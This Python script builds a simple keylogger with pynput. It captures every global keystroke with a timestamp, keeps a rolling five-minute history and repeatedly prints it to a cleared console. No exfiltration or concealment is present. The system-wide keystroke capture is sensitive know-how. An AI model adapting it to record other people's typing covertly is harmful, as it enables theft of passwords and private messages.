from pynput.keyboard import Key, Listener
from pynput import keyboard
import logging
import datetime
from datetime import timedelta
import time
import os

MAX_SHORTIMEHISTORYTIMESPAN = timedelta(seconds=300)

def getTimeStampFromHistoryEntry(entry):
    return entry[1]

class KeyLogger:
    def __init__(self):
        self.shortTimeHistory = []
        self.longTimeHistory = []

    # Get a timeDelta from the given comparetime (as string) and the current system time
    def getTimeDeltaToNow(self, compareTime):
        currentTime = datetime.datetime.now()
        timeDelta = currentTime - compareTime
        return timeDelta

    # Callback function that has to be called on keypress
    def onKeyPress(self, keyStr):
        self.shortTimeHistory.append((keyStr, datetime.datetime.now()))
        try:
            if(len(self.shortTimeHistory) != 0):
                earliestTimeStampInHistory = getTimeStampFromHistoryEntry(self.shortTimeHistory[0])
                shortTimeHistoryTimeSpan = self.getTimeDeltaToNow(earliestTimeStampInHistory)
            else:
                shortTimeHistoryTimeSpan = timedelta(hours=0, minutes=0, seconds=0)
            # Remove elements as long as the time span in the shortTimeHistory is >5min
            while(shortTimeHistoryTimeSpan.seconds > MAX_SHORTIMEHISTORYTIMESPAN.seconds):
                self.shortTimeHistory.pop(0)
                if(len(self.shortTimeHistory) != 0):
                    earliestTimeStampInHistory = getTimeStampFromHistoryEntry(self.shortTimeHistory[0])
                    shortTimeHistoryTimeSpan = self.getTimeDeltaToNow(earliestTimeStampInHistory)
                else:
                    shortTimeHistoryTimeSpan = timedelta(hours=0, minutes=0, seconds=0)
        except Exception as inst:
            print("EXCEPTION CATCHED. TYPE: " + str(type(inst)))    # the exception type

    # Get short time history. The STH shows every keystroke in the configured time span
    def getShortTimeHistory(self):
        return self.shortTimeHistory

mykeyLogger = KeyLogger()

def on_press(key):
    mykeyLogger.onKeyPress(str(key))

listener = keyboard.Listener(on_press=on_press)
listener.start()

while(1):
    print("STH:")
    shortTimeHistory = mykeyLogger.getShortTimeHistory()
    for item in shortTimeHistory:
        print(item)
    time.sleep(0.5)
    # Clearing the Screen
    os.system('cls')
